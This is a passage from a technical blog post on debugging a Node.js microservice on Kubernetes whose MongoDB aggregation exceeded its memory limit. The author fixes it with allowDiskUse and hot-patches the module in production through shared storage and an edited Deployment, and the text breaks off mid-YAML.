<h2 class="anchor anchorWithStickyNavbar_LWe7" id="initial-analysis-and-reproduction">Initial Analysis and Reproduction<a href="https://kbbgl.github.io/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes#initial-analysis-and-reproduction" class="hash-link" aria-label="Direct link to Initial Analysis and Reproduction" title="Direct link to Initial Analysis and Reproduction">​</a></h2>
<p>The issue was constantly reproducible which always simplifies things. All I needed to do was to restore the MongoDB dump, log in with a certain user and attempt to load the webpage with the list of resources.
I restored the MongoDB dump using:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mongorestore /path/to/dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>and logged in with the user and accessed the webpage.
I saw that the webpage layout loaded just fine but the actual resource tree was missing. I then opened up the Chrome Developer Tools and navigated to the ‘Network’ tab which allowed me to see the requests sent to the server and find the failing API call. Easily enough, I discovered that the:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-X</span><span class="token plain"> GET </span><span class="token variable" style="color:#36acaa">$SERVER</span><span class="token plain">/api/list</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Returned a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/500" target="_blank" rel="noopener noreferrer">500 HTTP response code (Internal Server Error)</a>. This indicates that there must be some uncaught exception thrown from the server side. The only way to understand the problem is to check the server logs and proceed from there.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="reviewing-server-logs">Reviewing Server Logs<a href="https://kbbgl.github.io/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes#reviewing-server-logs" class="hash-link" aria-label="Direct link to Reviewing Server Logs" title="Direct link to Reviewing Server Logs">​</a></h2>
<p>As I had a lot of experience dealing with the specific microservice and storage, I knew the architecture and dependencies pretty well. In short, it’s a NEAM (NodeJS + Express + Angular + MongoDB) stack. The list of resources were stored in a MongoDB collection (let’s call it resources). The DAL (data access layer) interacting with the resources collection was a NodeJS microservice running an Express server. The client generating the API call was running Angular. The microservices were running in Docker containers in a Kubernetes cluster.</p>
<p>Reviewing the NodeJS microservice logs, I saw the following error:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Exceeded memory limit for $group, but didn't allow external sort</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Researching this issue, I found that it’s related to the size of the MongoDB query generated. To understand the magnitude of the query, I checked the MongoDB collection size:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resources</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// 1242731</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This was the largest number of documents I’ve seen in this collection. It seems that the sort aggregation query generated to MongoDB was too large and couldn’t be processed by the server.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="brainstorming-solutions">Brainstorming Solutions<a href="https://kbbgl.github.io/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes#brainstorming-solutions" class="hash-link" aria-label="Direct link to Brainstorming Solutions" title="Direct link to Brainstorming Solutions">​</a></h2>
<p>Starting to think about the possible solutions, the first one that came to mind was to run some sort of cleanup scripts to remove MongoDB duplicates. Since I had a tool like that at my disposal, I ran it. But the script removed less than 1% of the documents.
The second solution was also related to decreasing the number of documents. But have the customer review the system and begin purging irrelevant resources from the web app. The customer reviewed their list of resources but could not find any particular resources that could be removed. So it seems that we need to somehow resolve the issue without decreasing the size of the collection.
After reviewing the NodeJS microservice source code, I found that the query generated by the DAL to MongoDB was the following (simplified version):</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// /path/to/resources.dal.js</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">getCollection</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'resources'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">aggregate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string-property property" style="color:#36acaa">"$group"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token string-property property" style="color:#36acaa">"ids"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token string-property property" style="color:#36acaa">"$push"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"$_id"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So seems that 1 million documents with this specific query was not going to be processed. I needed to find a way to modify the query to be able to execute successfully.
I did some research and found that MongoDB has a <code>100MB</code> system limit on blocking sort operation. There was no way to increase this limit. But, there was a way to work around this problem by using the disk as swap space to complement the RAM used by the query. MongoDB creates a temporary directory (<code>_tmp</code>) inside the <code>dbPath</code> storage location to generate and process the query.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="allowdiskuse-and-changing-source-code"><code>allowDiskUse</code> and Changing Source Code<a href="https://kbbgl.github.io/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes#allowdiskuse-and-changing-source-code" class="hash-link" aria-label="Direct link to allowdiskuse-and-changing-source-code" title="Direct link to allowdiskuse-and-changing-source-code">​</a></h2>
<p>The configuration to use the disk as swap space to increase the MongoDB system limit is quite easy. All we need to do is add the following object to the query:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token literal-property property" style="color:#36acaa">allowDiskUse</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Adding it to the source code on my test machine, it looked like this:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// /path/to/resources.dal.js</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">getCollection</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'resources'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">aggregate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string-property property" style="color:#36acaa">"$group"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token string-property property" style="color:#36acaa">"ids"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token string-property property" style="color:#36acaa">"$push"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"$_id"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token literal-property property" style="color:#36acaa">allowDiskUse</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Restarting the service for the changes to take effect, the <code>GET /api/resources</code> API call returned a 200. Success!
But, I faced one last problem: the issue is happening in production. How was I going to change the source code on a Docker container if upon recycling (kubectl delete pod $POD_NAME), the source code would be reverted to the original source code packed into the image?</p>
<p>After a few hours of tinkering around, trying to find an answer to this question, I was able to find a direction that would lead me to the solution implementation.
I started by reviewing a few things:</p>
<ul>
<li>The NodeJS microservice <code>Dockerfile</code> – I found that the <code>Dockerfile</code> executed the following command to start the server:</li>
</ul>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token instruction keyword" style="color:#00009f">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:#e3116c">"npm"</span><span class="token instruction">, </span><span class="token instruction string" style="color:#e3116c">"start"</span><span class="token instruction">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>The Kubernetes <code>Deployment</code> (shortened for brevity) had the same initial execution commands but with additional commands to move around some resources within the container and the shared storage location:</li>
</ul>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Deployment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> some</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">nodejs</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">labels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">purpose</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> backend</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">containers</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> some</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">nodejs</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">image</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> alpine</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">command</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"/bin/bash"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">args</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"-c"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"|"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"mkdir -p /tmp/other-res;"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"mv /path/to/app/tmp /tmp/other-res&amp;&amp;"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"npm start"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">volumeMounts</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">mountPath</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> /opt/storage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> storage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">volumes</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> storage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">persistentVolumeClaim</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">claimName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> storage</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">claim</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So my thought was: since I have access to the storage using the web application hosting a <a href="https://github.com/silverwind/droppy" target="_blank" rel="noopener noreferrer">Droppy</a> mounted as <code>/opt/storage</code> on the host machine, could I just add a modified NodeJS module with the fix and replace it before the server initializes?
It was worth a shot.
The first thing I needed to do is to copy the module from the container to the shared storage location. To do this, I ran the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl </span><span class="token builtin class-name">exec</span><span class="token plain"> some-nodejs-service-dd888bb69-plr6j -- </span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> /path/to/resources.dal.js /opt/storage/resources.dal.js</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I then modified the source code in the <code>resources.dal.js</code> module that added the <code>allowDiskUse: true</code> configuration.
Next step was to add a couple of more commands to the container before the NodeJS service is started. The first command is to rename the module:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">mv</span><span class="token plain"> /path/to/resources.dal.js /path/to/resources.dal.js.bak</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The next command is to copy the file from the shared storage (the one with the fix) into the container to replace the original module we renamed in the previous command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> /opt/storage/resources.dal.js /path/to/resources.dal.js</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I modified the Kubernetes <code>Deployment</code> using <code>kubectl edit deployment some-nodejs-service</code>. The modified Kubernetes container commands looked like this:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Deployment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> some</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">nodejs</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">labels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">purpose</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> backend</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">containers</span><span class="token punctuation" 